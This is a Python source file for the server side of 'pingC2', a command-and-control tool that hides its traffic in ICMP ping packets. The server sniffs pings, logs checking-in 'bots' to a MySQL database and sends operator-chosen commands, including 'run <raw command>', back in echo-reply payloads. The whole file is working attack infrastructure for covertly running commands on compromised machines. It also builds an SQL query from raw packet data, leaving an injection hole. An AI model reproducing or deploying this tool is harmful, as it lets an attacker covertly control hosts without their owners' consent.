#!/usr/bin/python

# pingC2 ICMP C2 server application
#  written by NoCow
# This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
#  and listen for the data payload of "What shall I do master?". If this data is received,
#  a command is sent to the client. Command must start with "run"

from multiprocessing import *
import threading
import MySQLdb
import ctypes
import sys
import signal
from scapy.all import *

#def updateCommand():
#	return command

def addBot(srcIP,name,os):
	print "[*] Adding bot"
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	try:
		cur.execute("""insert into bots (remoteip,name,os) values(%s,%s,%s)""",(srcIP,name,os))
                db.commit()
        except:
        	print "[X] Error adding bot to database"	

def displayMenu():
	listener = False
	print "\nChoose an option"
        #print "[D] Debug: ", active_children()
	#print len(active_children())
	for proc in active_children():
		if (proc.name == 'C2Listener'):
			listener = True;
        if listener == False:
		print "1) Start C2 listener"
	print "2) Display bots"
        print "3) Change bot command ('l' to list commands)"
        print "4) Stop C2 listener"
	print "q) Quit"

# Inerrupt handler to kill process cleanly
def handler(signum, frame):
	print 'Bye!'
	sys.exit()

# Command and Control main function
def c2main(command):
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	print ""
        print "[*] Command received from C2: %s" % command.value
	while True:
		logfile_error = open('errors.log','w')
		conf.verb = 0
        	count = 1
        	filter = "icmp"
		packet = sniff(count,filter=filter)
		for p in packet:
        		#p.show2()
                	try:
                		request = p['Raw'].load
                        	ip_id = p['IP'].id
                       		icmp_id = p['ICMP'].id
                       		print "[*] Request: " + request
				if 'What shall I do master?' in request:
					#command=updateCommand()
					query = "select id from bots where id="+request[24:]
					cur.execute(query)
					row = cur.fetchall()
					print "[D] Row: " + row	
					if row:
						print "[*] Bot ID exists, sending command"
						resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
						#resp.show2()
                                		send(resp)
						print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
						displayMenu()
						print "Option: "
					else:
						print "[*] Client not registered"
                        	elif 'Checkin' in request:
					# Build checkin database and info to capture
					print "\n[*] %s checking in" % p['IP'].src
					checkinInfo = request[8:].split()
                                        addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
					query='select max(id) from bots'
					cur.execute(query)
					row = cur.fetchall()
					for i in row:
						print "[D] row-botid:",i[0]
						botId=i[0]
					sendId = "id="+str(botId)
					#print "[D] SendId: ",sendId
					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(sendId)
                                        #resp.show2()
                                        send(resp)
                                        #print "\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value)
                                        displayMenu()
                                        print "Option: "
				elif 'sysinfo' in request:
					# Build sysinfo capture system database
                        		#print "[D] Inside sysinfo"
					sysinfo = request[8:].split()					
					print "[D] Id: " + sysinfo[0]
                                	print "\n[*] Received sysinfo from client: %s" % sysinfo
					cur.execute("select * from bots where id=%s",sysinfo[0])
                        		row = cur.fetchall()
                        		#print "[D] Row: ", row
					if not row :
                                		try:
							cur.execute("""insert into bots (id,remoteip,name,os) values(%s,%s,%s)""",(sysinfo[0],p['IP'].src,sysinfo[1],sysinfo[0]))
                                        		db.commit()
							print "[*] Adding machine from IP: ",p['IP'].src
                                		except: 
							print "[*] Machine already exists, ignoring"
					else:
						print "[*] Machine already exists, ignoring"
	
					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                	#resp.show2()
                                	print "\n[*] Response sent: Thanks"
                                	send(resp)
					displayMenu()      
                        		print "Option: "
				else:   
                                        print "[**] Client not recognized"
					displayMenu()
                	except:
				error = "[X] ERROR: " + str(sys.exc_info()[0])
                        	logfile_error.write(error)

def main(argv):
	print "	--------------------------------------------"
	print "	  _____    _                    _____   ___  "
 	print "	 |  __ \  (_)                  / ____| |__ \ "
 	print "	 | |__) |  _   _ __     __ _  | |         ) |"
 	print "	 |  ___/  | | | '_ \   / _` | | |        / / "
 	print "	 | |      | | | | | | | (_| | | |____   / /_ "
 	print "	 |_|      |_| |_| |_|  \__, |  \_____| |____|"
        print "        		        _/ |                "
        print "	 		      |___/		    "
        print "	 					    "
	print "	 		Command Center              "
	print "	 		   by NoCow		    "
	print "	--------------------------------------------"
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	manager = Manager()
	command = manager.Namespace()
	command.value = 'sysinfo'
	#print "[*] Command: %s" % command.value
	process = Process(name='C2Listener',target=c2main,args=(command,))
	displayMenu()
	while True:
		signal.signal(signal.SIGINT, handler)
		#displayMenu()
		option = raw_input("Option: ")
		#print "[D] Option chosen: ",option
		if option == '1':
			command.value = 'sysinfo'
			if (len(active_children()) > 1):
				print "[*] Capture running. Stopping first."
				for proc in active_children():
					if proc.name != 'SyncManager-1':		
						#print "[D] Killing process: ", proc.name
						proc.terminate()
				print "[*] Starting new capture"
				process = Process(name='C2Listener',target=c2main,args=(command,))
				process.start()
				if process.is_alive():
					print "[*] C2 Listening - command: %s" % command.value
				else:
					print "[X] Error starting C2 listener"
			else:
				print "[*] No listener currently running. Starting..."
				process = Process(name='C2Listener',target=c2main,args=(command,))
				process.start()
				if process.is_alive():
					print "[*] C2 Listening - command: %s" % command.value
				else:
					print "[X] Error starting C2 listener"
		elif option == '2':
			print "[*] Displaying bots!"
			cur.execute("select remoteip,localip,name,os from bots")
			print "RemoteIP	LocalIP	Name	OS"
			print "--------------------------------------"
			for row in cur.fetchall():
				print"%s	%s	%s	%s" % (row[0],row[1],row[2],row[3])
		elif option == '3':
                        if process.is_alive():
                        	command.value = raw_input("Enter a command: ")
				print "[*] C2 Listening - command: %s" % command.value
                        else:
                                print "[X] C2 listener not running. Please start listener first"
		elif option == '4':
			for proc in active_children():
				if proc.name == 'C2Listener':
					proc.terminate()
		elif option == 'l':
			print "\n Available commands: run <raw command>, sleep <seconds>, sysinfo"
		# Hidden debug option - display relevant info
		elif option == 'd':
			print "[D] Running Processes: ", active_children()
		elif option == 'q':
			for proc in active_children():
				proc.terminate()
			sys.exit()
		else:
			print "Invalid Option...please try again"

if __name__ == "__main__":
   main(sys.argv[1:])
